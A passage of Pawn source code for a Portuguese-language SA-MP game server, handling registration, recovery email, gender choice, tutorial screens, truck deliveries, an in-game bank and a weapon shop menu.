			WE_SetInt(gFile, "SkPistol", 1);
			WE_SetInt(gFile, "SkShotgun", 1);
			WE_SetInt(gFile, "SkMicro", 1);
			WE_SetInt(gFile, "SkMP5", 1);
			WE_SetInt(gFile, "SkRifle", 1);
			WE_SetInt(gFile, "SkSniper", 1);
			SetPlayerSkillLevel(playerid, WEAPONSKILL_PISTOL, 1);
			SetPlayerSkillLevel(playerid, WEAPONSKILL_PISTOL_SILENCED, 1);
			SetPlayerSkillLevel(playerid, WEAPONSKILL_DESERT_EAGLE, 1);
			SetPlayerSkillLevel(playerid, WEAPONSKILL_SHOTGUN, 1);
			SetPlayerSkillLevel(playerid, WEAPONSKILL_SAWNOFF_SHOTGUN, 1);
			SetPlayerSkillLevel(playerid, WEAPONSKILL_SPAS12_SHOTGUN, 1);
			SetPlayerSkillLevel(playerid, WEAPONSKILL_MICRO_UZI, 1);
			SetPlayerSkillLevel(playerid, WEAPONSKILL_MP5, 1);
			SetPlayerSkillLevel(playerid, WEAPONSKILL_AK47, 1);
			SetPlayerSkillLevel(playerid, WEAPONSKILL_M4, 1);
			SetPlayerSkillLevel(playerid, WEAPONSKILL_SNIPERRIFLE, 1);
 			dataRegistro(playerid);
 			ultimoLogin(playerid);
			pInfo[playerid][Continuar] = false;
			pInfo[playerid][Logado] = true;
			format(s5Doze, sizeof(s5Doze), "{FFFFFF}E-mail para recuperação de conta para prevenções futuras.\n\nDigite um e-mail válido e ativo e ativo:", PlayerName(playerid));
			ShowPlayerDialog(playerid, D_EMAIL, DIALOG_STYLE_INPUT, "{FFFFFF}E-mail para recuperação.", s5Doze, "Salvar", "");
		}
		return 1;
	}
	if(dialogid == D_EMAIL)
	{
		if(!response)
		{
	        SendClientMessage(playerid, COR_ERRO, "Coloque um e-mail!");
			format(s5Doze, sizeof(s5Doze), "{FFFFFF}E-mail para recuperação de conta para prevenções futuras.\n\nDigite um e-mail válido e ativo:", PlayerName(playerid));
			ShowPlayerDialog(playerid, D_EMAIL, DIALOG_STYLE_INPUT, "{FFFFFF}E-mail para recuperação.", s5Doze, "Salvar", "");
			return 0;
		}
	    if(!strlen(inputtext))
	    {
	        SendClientMessage(playerid, COR_ERRO, "Coloque um e-mail válido!");
			format(s5Doze, sizeof(s5Doze), "{FFFFFF}E-mail para recuperação de conta para prevenções futuras.\n\nDigite um e-mail válido e ativo:", PlayerName(playerid));
			ShowPlayerDialog(playerid, D_EMAIL, DIALOG_STYLE_INPUT, "{FFFFFF}E-mail para recuperação.", s5Doze, "Salvar", "");
			return 0;
  		}
		WE_SetString(gFile, "Email", inputtext);
		SendClientMessage(playerid, AZUL_WE, "E-mail registrado com sucesso!");
		new pMail[256];
		format(pMail, 256, "%s", inputtext);
		format(pFile, sizeof(pFile), "Não esqueça seu e-mail: {FFFFFF}%s", pMail);
		SendClientMessage(playerid, VERMELHO_WE, pFile);
		new
  			linha_1[] = "Olá, informe-nos seu sexo.",
  			linha_2[] = "{FFFFFF}Você é do sexo {1E90FF}Masculino{FFFFFF} ou {F37DD0}Feminino{FFFFFF}?",
  			linha_3[] = "{FF0000}* {FFFFFF}Selecione uma das opções abaixo.",
  			stg[512]
  		;
  		format(stg, sizeof(stg), "%s\n%s\n%s\n%s\n%s", linha_1, linha_2, linha_3);
		ShowPlayerDialog(playerid, D_SEXO, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Sexo", stg, "Masculino", "Feminino");
		return 1;
	}
	/*if(dialogid == D_PCHAVL)
	{
		if(!response)
		{
			SendClientMessage(playerid, COR_ERRO, "Você cancelou o login pela chave de recuperação!");
		    Kick(playerid);
		    return 1;
		}
		if(response)
		{
			if(fexist(gFile))
			{
			    new
					password = WE_GetInt(gFile, "Email")
				;
		       	if(pass_hash(inputtext) != password)
				{
				    if(pInfo[playerid][psErrou] >= 1)
				    {
					    format(gStr, sizeof(gStr), "{FF0000}Chave de recuperação não compatível!", pInfo[playerid][psErrou]);
	                	SendClientMessage(playerid, COR_ERRO, gStr);
				        pInfo[playerid][psErrou] = 0;
				        SendClientMessage(playerid, COR_ERRO, "Você errou sua chave de recuperação duas vezes!");
				        Kick(playerid);
						return 1;
					}
				    pInfo[playerid][psErrou] += 1;
				    format(gStr, sizeof(gStr), "{FF0000}Chave de recuperação não compatível!", pInfo[playerid][psErrou]);
                	SendClientMessage(playerid, COR_ERRO, gStr);
					format(s5Doze, sizeof(s5Doze), "\t{FFFFFF} Acessar conta pela chave de recuperação.\n\nColoque abaixo sua chave de recuperação para logar em sua conta:", PlayerName(playerid));
					ShowPlayerDialog(playerid, D_PCHAVL, DIALOG_STYLE_PASSWORD, "{FFFFFF}Chave para recuperação.", s5Doze, "Logar", "");
					return 0;
				}
				else
				{
					pInfo[playerid][Logado] = true;
					CarregarFile(playerid);
					SpawnPlayer(playerid);
					return 1;
				}
			}
		}
		return 1;
	}*/
	if(dialogid == D_SEXO)
	{
		if(response)
		{
			TextDrawHideForPlayer(playerid, WE_GAMES1);
			TextDrawHideForPlayer(playerid, WE_GAMES2);
			TextDrawHideForPlayer(playerid, LoginScreen[0]);
			TextDrawHideForPlayer(playerid, LoginScreen[1]);
			TextDrawHideForPlayer(playerid, LoginScreen[2]);
			TextDrawHideForPlayer(playerid, LoginScreen[3]);
			TextDrawHideForPlayer(playerid, LoginScreen[4]);
			TextDrawHideForPlayer(playerid, LoginScreen[5]);
			TextDrawHideForPlayer(playerid, LoginScreen[6]);
			TextDrawHideForPlayer(playerid, LoginScreen[7]);
			TextDrawHideForPlayer(playerid, BoxCarregando);
			TextDrawHideForPlayer(playerid, Flash);
			WE_SetInt(gFile, "Sexo", 1);
			WE_SetInt(gFile, "Skin", 250);
			SendClientMessage(playerid, COR_AMARELO, "Ok, seu sexo é masculino.");
			CarregarFile(playerid);
			NoTuto[playerid] = true;
			TutoID[playerid] = 1;
			LimparChat(playerid, 150);
			SetPlayerInterior(playerid, 0);
			SetPlayerVirtualWorld(playerid, 0);
			TogglePlayerSpectating(playerid, true);
			SetSpawnInfo(playerid,0,pInfo[playerid][SkinP], 956.8359, -2071.6855, 38.4553, 271.5927,0,0,0,0,0,0);
			SpawnPlayer(playerid);
			InterpolateCameraPos(playerid, 956.8359, -2071.6855, 38.4553, 365.351654, -2145.143066, 41.203365, 7000);
			InterpolateCameraLookAt(playerid, 745.3615, -1843.4775, 7.8833, 365.447052, -2140.324951, 39.870460, 7000);
			SetTimerEx("TutorialText", 7000, false, "id", playerid, 1);
			ContagemFome[playerid] = SetTimerEx("Fome", 216000, true, "i", playerid);
			ContagemSede[playerid] = SetTimerEx("Sede", 80000, true, "i", playerid);
			ContagemSono[playerid] = SetTimerEx("Sono", 900000, true, "i", playerid);
		}
		else if(!response)
		{
			TextDrawHideForPlayer(playerid, WE_GAMES1);
			TextDrawHideForPlayer(playerid, WE_GAMES2);
			TextDrawHideForPlayer(playerid, LoginScreen[0]);
			TextDrawHideForPlayer(playerid, LoginScreen[1]);
			TextDrawHideForPlayer(playerid, LoginScreen[2]);
			TextDrawHideForPlayer(playerid, LoginScreen[3]);
			TextDrawHideForPlayer(playerid, LoginScreen[4]);
			TextDrawHideForPlayer(playerid, LoginScreen[5]);
			TextDrawHideForPlayer(playerid, LoginScreen[6]);
			TextDrawHideForPlayer(playerid, LoginScreen[7]);
			TextDrawHideForPlayer(playerid, BoxCarregando);
			TextDrawHideForPlayer(playerid, Flash);
			WE_SetInt(gFile, "Sexo", 2);
			WE_SetInt(gFile, "Skin", 12);
			SendClientMessage(playerid, COR_AMARELO, "Ok, seu sexo é feminino.");
			CarregarFile(playerid);
			NoTuto[playerid] = true;
			TutoID[playerid] = 1;
			LimparChat(playerid, 150);
			SetPlayerInterior(playerid, 0);
			SetPlayerVirtualWorld(playerid, 0);
			TogglePlayerSpectating(playerid, true);
		    SetPlayerCameraPos(playerid, 1447.2264, -1784.6260, 13.5949);
			SetPlayerCameraLookAt(playerid, 1447.2264, -1784.6260, 13.5949);
			SetSpawnInfo(playerid,0,pInfo[playerid][SkinP], 1447.2264, -1784.6260, 13.5949, 271.5927,0,0,0,0,0,0);
			SpawnPlayer(playerid);
			InterpolateCameraPos(playerid, 1447.2264, -1784.6260, 13.5949, 365.351654, -2145.143066, 41.203365, 7000);
			InterpolateCameraLookAt(playerid, 1447.2264, -1784.6260, 13.5949, 365.447052, -2140.324951, 39.870460, 7000);
			SetTimerEx("TutorialText", 70000, true, "id", playerid, 1);
			ContagemFome[playerid] = SetTimerEx("Fome", 216000, true, "i", playerid);
			ContagemSede[playerid] = SetTimerEx("Sede", 80000, true, "i", playerid);
			ContagemSono[playerid] = SetTimerEx("Sono", 900000, true, "i", playerid);
			ShowTextDrawStatus(playerid);
			SetStatusBar(playerid, BAR_FOME, Player_barEat[playerid], GetPVarInt(playerid, "Fome"));
			SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], GetPVarInt(playerid, "Sede"));
			SetStatusBar(playerid, BAR_SONO, Player_barSleep[playerid], GetPVarInt(playerid, "Sono"));
		}
		return 1;
	}
	if(dialogid == D_TUTO)
	{
		if(response)
		{
			SetPlayerPos(playerid, 1482.4447,-1785.0928,10.1966);
			SetPlayerCameraPos(playerid, 1460.8201,-1768.5342,35.8979);
			SetPlayerCameraLookAt(playerid, 1501.2737,-1784.2040,13.5936);
			SetTimerEx("TutoBanco", 14000, false, "i", playerid);
		}
 		else if(!response)
		{
   		  	SetPlayerPos(playerid, 1482.4447,-1785.0928,10.1966);
			SetPlayerCameraPos(playerid, 1460.8201,-1768.5342,35.8979);
			SetPlayerCameraLookAt(playerid, 1501.2737,-1784.2040,13.5936);
  			TogglePlayerControllable(playerid, false);
  			TextDrawShowForPlayer(playerid, BaseTuto[0]);
  			TextDrawShowForPlayer(playerid, BaseTuto[1]);
  			TextDrawShowForPlayer(playerid, BaseTuto[2]);
  			TextDrawShowForPlayer(playerid, BaseTuto[3]);
  			PlayerTextDrawShow(playerid, TutoText[playerid][0]);
  			PlayerTextDrawShow(playerid, TutoText[playerid][1]);
  			PlayerTextDrawShow(playerid, TutoText[playerid][2]);
  			PlayerTextDrawShow(playerid, TutoText[playerid][3]);
  			PlayerTextDrawShow(playerid, TutoText[playerid][4]);
  			PlayerTextDrawShow(playerid, TutoText[playerid][4]);
			SetTimerEx("TutoBanco", 14000, false, "i", playerid);
		}
		return 1;
	}
	if(dialogid == D_TUTO11)
	{
		if(response)
		{
   			if(WE_GetInt(gFile, "Registrado") == 1)
   			{
				SetPlayerPos(playerid, oPosx[playerid], oPosy[playerid], oPosz[playerid]);
				SetPlayerFacingAngle(playerid, oPosa[playerid]);
				SetCameraBehindPlayer(playerid);
			    TogglePlayerControllable(playerid, true);
			    NoTuto[playerid] = false;
  				LimparChat(playerid, 30);
  				SendClientMessage(playerid, VERMELHO_WE, "Você terminou a leitura do tutorial.");
  				SendClientMessage(playerid, AZUL_WE, "Para evitar problemas, quebra de regras, dentre outras situações, leia as regras, use: /Regras");
			}
			else
			{
			    pInfo[playerid][MsgSpawn] = 1;
			    pInfo[playerid][pLogin] = true;
			    SpawnPlayer(playerid);
			    NoTuto[playerid] = false;
				LimparChat(playerid, 30);
   			    SendClientMessage(playerid, VERMELHO_WE, "Você terminou a leitura do tutorial. Seja bem-vindo(a)");
			    SendClientMessage(playerid, AZUL_WE, "Para evitar problemas, quebra de regras, dentre outros, use: /Regras");
				format(gStr, sizeof(gStr), "~r~~h~BEM-VINDO(A) ~b~~h~%s", PlayerName(playerid));
				GameTextForPlayer(playerid, gStr, 5000, 1);
				WE_SetInt(gFile, "Registrado", 1);
			}
		}
 		else if(!response)
		{
   			if(WE_GetInt(gFile, "Registrado") == 1)
   			{
				SetPlayerPos(playerid, oPosx[playerid], oPosy[playerid], oPosz[playerid]);
				SetPlayerFacingAngle(playerid, oPosa[playerid]);
				SetCameraBehindPlayer(playerid);
			    TogglePlayerControllable(playerid, true);
			    NoTuto[playerid] = false;
  				LimparChat(playerid, 30);
  				SendClientMessage(playerid, VERMELHO_WE, "Você terminou a leitura do tutorial.");
  				SendClientMessage(playerid, AZUL_WE, "Para evitar problemas, quebra de regras,");
  				SendClientMessage(playerid, AZUL_WE, "> dentre outras situações, leia as regras atentamente, use: /Regras");
			}
			else
			{
			    pInfo[playerid][MsgSpawn] = 1;
			    pInfo[playerid][pLogin] = true;
			    SpawnPlayer(playerid);
			    NoTuto[playerid] = false;
				LimparChat(playerid, 30);
   			    SendClientMessage(playerid, VERMELHO_WE, "Você terminou a leitura do tutorial. Seja bem-vindo(a)");
			    SendClientMessage(playerid, AZUL_WE, "Para evitar problemas, quebra de regras, dentre outros, use: /Regras");
				format(gStr, sizeof(gStr), "~r~~h~BEM-VINDO(A) ~b~~h~%s", PlayerName(playerid));
				GameTextForPlayer(playerid, gStr, 5000, 1);
				WE_SetInt(gFile, "Registrado", 1);
			}
		}
		return 1;
	}
	if(dialogid == D_CARGA)
	{
        if(response)
        {
	        switch(listitem)
	        {
	            case 0:
         		{
	    			SendClientMessage(playerid, AZUL_WE, "Sua carreta foi carregada para Ind. Solarin!");
					SendClientMessage(playerid, AZUL_WE, "Foi marcado no seu radar um Caminhão, siga-o para descarregar!");
					GameTextForPlayer(playerid, "~y~~h~carregado", 1000, 0);
					Carga[playerid] = 1;
					Carregou[playerid] = 1;
					SetTimerEx("CheckComandos", 30000, false, "d", playerid);
		  			RemovePlayerMapIcon(playerid, 90);
			    	SetPlayerMapIcon(playerid, 90, -1823.9757,54.3441,15.1228, 51,0,MAPICON_GLOBAL_CHECKPOINT);
	            }
	            case 1:
				{
					SendClientMessage(playerid, AZUL_WE, "Sua carreta foi carregada para Wang Cars!");
					SendClientMessage(playerid, AZUL_WE, "Foi marcado no seu radar um Caminhão, siga-o para descarregar!");
					GameTextForPlayer(playerid, "~y~~h~carregado", 1000, 0);
					Carga[playerid] = 1;
					Carregou[playerid] = 1;
					SetTimerEx("CheckComandos", 30000, false, "d", playerid);
		  			RemovePlayerMapIcon(playerid, 90);
			    	SetPlayerMapIcon(playerid, 90, -1934.6858,259.0710,41.6420, 51,0,MAPICON_GLOBAL_CHECKPOINT);
	            }
	            case 2:
         		{
					SendClientMessage(playerid, AZUL_WE, "Sua carreta foi carregada para Michelin Pneus!");
					SendClientMessage(playerid, AZUL_WE, "Foi marcado no seu radar um Caminhão, siga-o para descarregar!");
					GameTextForPlayer(playerid, "~y~~h~carregado", 1000, 0);
					Carga[playerid] = 1;
					Carregou[playerid] = 1;
					SetTimerEx("CheckComandos", 30000, false, "d", playerid);
		  			RemovePlayerMapIcon(playerid, 90);
			    	SetPlayerMapIcon(playerid, 90, 1635.2142,2192.1284,11.4099, 51,0,MAPICON_GLOBAL_CHECKPOINT);
	            }
	            case 3:
         		{
					SendClientMessage(playerid, AZUL_WE, "Sua carreta foi carregada para Sprunk!");
					SendClientMessage(playerid, AZUL_WE, "Foi marcado no seu radar um Caminhão, siga-o para descarregar!");
					GameTextForPlayer(playerid, "~y~~h~carregado", 1000, 0);
					Carga[playerid] = 1;
					Carregou[playerid] = 1;
					SetTimerEx("CheckComandos", 30000, false, "d", playerid);
		  			RemovePlayerMapIcon(playerid, 90);
			    	SetPlayerMapIcon(playerid, 90, 1338.3881,286.8327,20.1563, 51,0,MAPICON_GLOBAL_CHECKPOINT);
	            }
	            case 4:
         		{
					SendClientMessage(playerid, AZUL_WE, "Sua carreta foi carregada para Xoomer!");
					SendClientMessage(playerid, AZUL_WE, "Foi marcado no seu radar um Caminhão, siga-o para descarregar!");
					GameTextForPlayer(playerid, "~y~~h~carregado", 1000, 0);
					Carga[playerid] = 1;
					Carregou[playerid] = 1;
					SetTimerEx("CheckComandos", 30000, false, "d", playerid);
		  			RemovePlayerMapIcon(playerid, 90);
			    	SetPlayerMapIcon(playerid, 90, 219.3734,9.5520,3.1495, 51,0,MAPICON_GLOBAL_CHECKPOINT);
	            }
	            case 5:
	            {
					SendClientMessage(playerid, AZUL_WE, "Sua carreta foi carregada para FlaischBerg!");
					SendClientMessage(playerid, AZUL_WE, "Foi marcado no seu radar um Caminhão, siga-o para descarregar!");
					GameTextForPlayer(playerid, "~y~~h~carregado", 1000, 0);
					Carga[playerid] = 1;
					Carregou[playerid] = 1;
					SetTimerEx("CheckComandos", 30000, false, "d", playerid);
		  			RemovePlayerMapIcon(playerid, 90);
			    	SetPlayerMapIcon(playerid, 90, -225.2885,-209.2343,2.0181, 51,0,MAPICON_GLOBAL_CHECKPOINT);
	            }
	            case 6:
	            {
					SendClientMessage(playerid, AZUL_WE, "Sua carreta foi carregada para RS Haul!");
					SendClientMessage(playerid, AZUL_WE, "Foi marcado no seu radar um Caminhão, siga-o para descarregar!");
					GameTextForPlayer(playerid, "~y~~h~carregado", 1000, 0);
					Carga[playerid] = 1;
					Carregou[playerid] = 1;
					SetTimerEx("CheckComandos", 30000, false, "d", playerid);
		  			RemovePlayerMapIcon(playerid, 90);
			    	SetPlayerMapIcon(playerid, 90, -57.8455,-1137.6748,1.6719, 51,0,MAPICON_GLOBAL_CHECKPOINT);
	            }
	        }
		}
		//if(!response)
		else
		{
			//ShowPlayerDialog(playerid, D_CARGA, DIALOG_STYLE_LIST, "{FF0000}Entregas disponíveis", "\nInd. Solarion SF - {32CD32}R$1050\nWang Cars SF - {32CD32}R$1200\nMichelin Pneus LV - {32CD32}R$1300\nSprunk LS - {32CD32}R$950\nXoomer LS - {32CD32}R$950\nFlaischBerg LS - {32CD32}R$900\nRS Haul LS - {32CD32}R$800", "Carregar", "");
			SendClientMessage(playerid, VERMELHO_WE, "Você cancelou a seleção de entregas");
		}
	}
	//Petroleiro
	if(dialogid == D_CARGA)
	{
        if(response)
        {
	        switch(listitem)
	        {
				case 0:
				{
		    		SendClientMessage(playerid, AZUL_WE, "Seu caminhão de petróleo foi carregado !");
					SendClientMessage(playerid, AZUL_WE, "Vá até um posto de gasolina e descarregue !!");
					GameTextForPlayer(playerid, "~y~~h~carregado", 1000, 0);
					PCarga[playerid] = 1;
					Carregado[playerid] = 1;
					SetTimerEx("CheckComandos", 30000, false, "d", playerid);
				}
			}
   		}
	}
	if(dialogid == D_CONTABANCO)
	{
        if(response)
		{
		    if(!strlen(inputtext))
		    {
			    format(gStr, sizeof(gStr), "Não deixe o campo em branco !\n\nNome de usuário: %s\n\nInsira uma senha:", PlayerName(playerid));
                ShowPlayerDialog(playerid, D_CONTABANCO, DIALOG_STYLE_INPUT, "Conta Bancária", gStr, "Criar", "Cancelar");
                return 1;
			}
			PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
			SendClientMessage(playerid, 0xFFFFFFAA, "Sua conta bancária foi criada!");
			format(gStr, sizeof(gStr), "Não esqueça de sua senha: {FF0000}%s", inputtext);
			SendClientMessage(playerid, 0x1E90FFFF, gStr);
            WE_SetInt(gFile, "SenhaBanco", pass_hash(inputtext));
            WE_SetInt(gFile, "ContaBanco", 1);
            pInfo[playerid][ContaBanco] = 1;
		}
		return 1;
	}
	if(dialogid == D_LOGINBANCO)
	{
	    if(response)
		{
            if(!strlen(inputtext))
		    {
               	format(gStr, sizeof(gStr), "{FF0000}Digite a senha!\n\nNome de usuário: %s\n\nInsira sua senha bancária:", PlayerName(playerid));
        		ShowPlayerDialog(playerid, D_LOGINBANCO, DIALOG_STYLE_INPUT, "Conta Bancária", gStr, "Entrar", "Cancelar");
				return 1;
			}
		    if(pass_hash(inputtext) != WE_GetInt(gFile, "SenhaBanco"))
			{
				SendClientMessage(playerid, COR_ERRO, "Senha incorreta!");
               	format(gStr, sizeof(gStr), "{FF0000}Senha incorreta!\n\nNome de usuário: %s\n\nInsira sua senha bancária:", PlayerName(playerid));
        		ShowPlayerDialog(playerid, D_LOGINBANCO, DIALOG_STYLE_INPUT, "Conta Bancária", gStr, "Entrar", "Cancelar");
			}
			else
            {
				SendClientMessage(playerid, COR_AMARELO, "Sua conta bancária foi carregada!");
                PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
				BancoLogin[playerid] = 1;
			}
		}
		return 1;
	}
	if(dialogid == D_SENHABANCO)
	{
		if(response)
		{
			if(!strlen(inputtext))
			{
				ShowPlayerDialog(playerid, D_SENHABANCO, DIALOG_STYLE_INPUT, "Conta Bancária", "Conta Bancária\n\nInsira sua senha atual:", "Confirmar", "Cancelar");
				return 1;
			}
		    if(pass_hash(inputtext) != WE_GetInt(gFile, "SenhaBanco"))
			{
	            ShowPlayerDialog(playerid, D_SENHABANCO, DIALOG_STYLE_INPUT, "Conta Bancária", "{FF0000}A senha digitada não bate com sua senha atual!\n\n{FFFFFF}Insira sua senha atual:", "Confirmar", "Cancelar");
			}
			else
			{
				ShowPlayerDialog(playerid, D_SENHABANCO2, DIALOG_STYLE_INPUT, "Conta Bancária", "Senha confirmada!\n\nInsira sua {FAF65D}nova senha{FFFFFF}:", "Confirmar", "Cancelar");
            }
		}
		return 1;
	}
	if(dialogid == D_SENHABANCO2)
	{
		if(response)
		{
			if(!strlen(inputtext))
			{
				ShowPlayerDialog(playerid, D_SENHABANCO2, DIALOG_STYLE_INPUT, "Conta Bancária", "Senha confirmada!\n\nInsira sua {FAF65D}nova senha{FFFFFF}:", "Confirmar", "Cancelar");
				return 1;
			}
			SendClientMessage(playerid, COR_AMARELO, "Sua senha foi alterada com sucesso!");
            format(gStr, sizeof(gStr), "Sua nova senha não se esqueça: {FF0000}%s", inputtext);
            SendClientMessage(playerid, 0x1E90FFFF, gStr);
            WE_SetInt(gFile, "SenhaBanco", pass_hash(inputtext));
		}
		return 1;
	}
	if(dialogid == D_iBANCO)
	{
		if(response)
		{
			format(s5Doze, sizeof(s5Doze), "\t{00FFFF}Banco {FF1E1E}W{1E90FF}E{FFF000}Games{FF3333}\n\n{1E90FF}Saldo atual: {3DB134}R$%d\n{1E90FF}Dinheiro em mãos: {3DB134}R$%d\n\n{1E90FF}Horario: {FFFFFF}%02d:%02d:%02d\n\n{1E90FF}Data: {FFFFFF}%d/%02d/%d\n", WE_GetInt(gFile, "SaldoBanco"), GetPlayerCash(playerid), hora, minuto, segundo, dia, mes, ano);
			ShowPlayerDialog(playerid, D_SALDO, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Saldo Bancário", s5Doze, "Ok", "");
		}
		else
		{
			format(gStr, sizeof(gStr), "Transação Bancária\n\nNome de usuário: %s\n\nQual transação você deseja realizar:", PlayerName(playerid));
            ShowPlayerDialog(playerid, D_TRANSACAO, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Caixa Eletrônico", gStr, "Deposito", "Saque");
		}
		return 1;
	}
	if(dialogid == D_TRANSACAO)
	{
		if(response)
		{
			format(gStr, sizeof(gStr), "Deposito Bancário\n\nNome de usuário: %s\n\nInsira a quantia que deseja depositar:", PlayerName(playerid));
            ShowPlayerDialog(playerid, D_DEPOSITO, DIALOG_STYLE_INPUT, "Caixa Eletrônico", gStr, "Depositar", "Cancelar");
		}
		else
		{
			format(gStr, sizeof(gStr), "Saque Bancário\n\nNome de usuário: %s\n\nInsira a quantia que deseja sacar:", PlayerName(playerid));
            ShowPlayerDialog(playerid, D_SAQUE, DIALOG_STYLE_INPUT, "Caixa Eletrônico", gStr, "Sacar", "Cancelar");
		}
		return 1;
	}
	if(dialogid == D_DEPOSITO)
	{
	    if(response)
	    {
			if(pInfo[playerid][ContaBanco] == 0)
			{
			    SendClientMessage(playerid, COR_ERRO, "Você não tem uma conta bancária! (/AbrirConta)");
				return 1;
			}
			new
				dinheiro = strval(inputtext)
			;
			if(!strlen(inputtext))
			{
				format(gStr, sizeof(gStr), "Deposito Bancário\n\nNome de usuário: %s\n\nInsira a quantia que deseja depositar:", PlayerName(playerid));
            	ShowPlayerDialog(playerid, D_DEPOSITOU, DIALOG_STYLE_INPUT, "Caixa Eletrônico", gStr, "Depositar", "Cancelar");
				return 1;
			}
		   	if(GetPlayerCash(playerid) < dinheiro || dinheiro <= 0 || dinheiro >= 15000001)
			{
				SendClientMessage(playerid, COR_ERRO, "Não é permitido depositar uma quantia acima de 15 milhões!");
				return 1;
			}
			sGivePlayerCash(playerid, -dinheiro);
			WE_SetInt(gFile, "SaldoBanco", WE_GetInt(gFile, "SaldoBanco") + dinheiro);
			if(ComBolsa[playerid] == true)
			{
			    RemovePlayerAttachedObject(playerid, 3);
			    ComBolsa[playerid] = false;
			}
            format(s5Doze, sizeof(s5Doze), "\t{00FFFF}Banco {FF1E1E}W{1E90FF}E{FFF000}Games{FF3333}\n\n{1E90FF}Saldo atual: {3DB134}R$%d\n{1E90FF}Dinheiro em mãos: {3DB134}R$%d\n\n{1E90FF}Horario: {FFFFFF}%02d:%02d:%02d\n\n{1E90FF}Data: {FFFFFF}%d/%02d/%d\n", dinheiro, WE_GetInt(gFile, "SaldoBanco"), hora, minuto, segundo, dia, mes, ano);
			ShowPlayerDialog(playerid, D_SACOU, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Depósito Bancário", s5Doze, "Ok", "");
		}
		return 1;
	}
	if(dialogid == D_SAQUE)
	{
	    if(response)
	    {
			if(pInfo[playerid][ContaBanco] == 0)
			{
			    SendClientMessage(playerid, COR_ERRO, "Você não tem uma conta bancária! (/AbrirConta)");
				return 1;
			}
            new
				dinheiro = strval(inputtext)
			;
			if(!strlen(inputtext))
			{
				format(gStr, sizeof(gStr), "Saque Bancário\n\nNome de usuário: %s\n\nInsira a quantia que deseja sacar:", PlayerName(playerid));
            	ShowPlayerDialog(playerid, D_SAQUE, DIALOG_STYLE_INPUT, "Caixa Eletrônico", gStr, "Sacar", "Cancelar");
				return 1;
			}
			if(WE_GetInt(gFile, "SaldoBanco") < dinheiro || dinheiro <= 0 || dinheiro >= 15000001)
			{
				SendClientMessage(playerid, COR_ERRO, "Não é permitido depositar uma quantia acima de 15 milhões!");
				return 1;
			}
			sGivePlayerCash(playerid, dinheiro);
			WE_SetInt(gFile, "SaldoBanco", WE_GetInt(gFile, "SaldoBanco") - dinheiro);
			format(s5Doze, sizeof(s5Doze), "\t{00FFFF}Banco {FF1E1E}W{1E90FF}E{FFF000}Games{FF3333}\n\n{1E90FF}Saldo atual: {3DB134}R$%d\n{1E90FF}Dinheiro em mãos: {3DB134}R$%d\n\n{1E90FF}Horario: {FFFFFF}%02d:%02d:%02d\n\n{1E90FF}Data: {FFFFFF}%d/%02d/%d\n", dinheiro, WE_GetInt(gFile, "SaldoBanco"), hora, minuto, segundo, dia, mes, ano);
			ShowPlayerDialog(playerid, D_DEPOSITOU, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Depósito Bancário", s5Doze, "Ok", "");
		}
		return 1;
	}
	if(dialogid == SLOT_ARMAS)
    {
        if(response)
        {
	        switch(listitem)
	        {
	            case 0:
	            {
	    			ShowPlayerDialog(playerid, SLOT_ARMAS+1, DIALOG_STYLE_LIST, "{FF6633}Ammunation Viva WE", "{9C9C9C}Pistolas\n{FF9500}Escopetas\n{FF0000}Metralhadoras\n{8C3F00}Rifles", "Ver", "Voltar");
	            }
	            case 1:
	            {
				    ShowPlayerDialog(playerid, SLOT_ARMAS+2, DIALOG_STYLE_LIST, "{FF6633}Ammunation Viva WE", "Soco Inglês\nTaco de Golf\nCacetete\nFaca\nTaco de Baseball\nInchada\nTaco de Bilhar\nKatana\nSerra Elétrica", "Comprar", "Voltar");
	            }
	          	case 2:
	            {
				    ShowPlayerDialog(playerid, SLOT_ARMAS+3, DIALOG_STYLE_LIST, "{FF6633}Ammunation Viva WE", "Spray\nCâmera\nParaquedas", "Comprar", "Voltar");
	            }
			}
		}
	}
	if(dialogid == SLOT_ARMAS+1)
	{
        if(response)
        {
	        switch(listitem)
	        {
	            case 0:
         		{
	    			ShowPlayerDialog(playerid, SLOT_ARMAS+4, DIALOG_STYLE_LIST, "{FF6633}Ammunation Viva WE", "Pistola 9mm\nPistola Silenciosa 9mm\nPistola Desert Eagle", "Comprar", "Voltar");
	            }
	            case 1:
         		{
	    			ShowPlayerDialog(playerid, SLOT_ARMAS+5, DIALOG_STYLE_LIST, "{FF6633}Ammunation Viva WE", "Shotgun\nCombat Shotgun", "Comprar", "Voltar");
	            }
	            case 2:
         		{
	    			ShowPlayerDialog(playerid, SLOT_ARMAS+6, DIALOG_STYLE_LIST, "{FF6633}Ammunation Viva WE", "Metralhadora MP5\nMetralhadora AK-47\nMetralhadora M4", "Comprar", "Voltar");
	            }
	            case 3:
         		{
	    			ShowPlayerDialog(playerid, SLOT_ARMAS+7, DIALOG_STYLE_LIST, "{FF6633}Ammunation Viva WE", "Rifle\nSniper Rifle", "Comprar", "Voltar");
	            }
	            case 4:
         		{
	    			ShowPlayerDialog(playerid, SLOT_ARMAS+8, DIALOG_STYLE_LIST, "{FF6633}Ammunation Viva WE", "Granada\nGarrafa de Fogo\nGranada de Gás", "Comprar", "Voltar");
	            }
	        }
		}
		if(!response)
		{
			ShowPlayerDialog(playerid, SLOT_ARMAS, DIALOG_STYLE_LIST, "{FF6633}Ammunation Viva WE", "{FF0000}Armas de Fogo\n{FFFFFF}Armas Brancas\n{1E90FF}Acessórios", "Ver", "Sair");
		}
	}
	if(dialogid == SLOT_ARMAS+4)
	{
        if(response)
        {
	        switch(listitem)
	        {
	            case 0:
	            {
	                if(WE_GetInt(gFile, "Pistola_9mm") == 1)
	                {
	               		SendClientMessage(playerid, COR_ERRO, "Você já tem uma Pistola 9mm!");
	                    return 1;
	                }
	            	if(GetPlayerCash(playerid) < 750)
	            	{
	           			SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro suficiente para comprar uma Pistola 9mm! ({FFFFFF}{009900}R$750{FFFFFF})");
					}
					else if(GetPlayerCash(playerid) >= 750)
					{
					    sGivePlayerCash(playerid, -750);
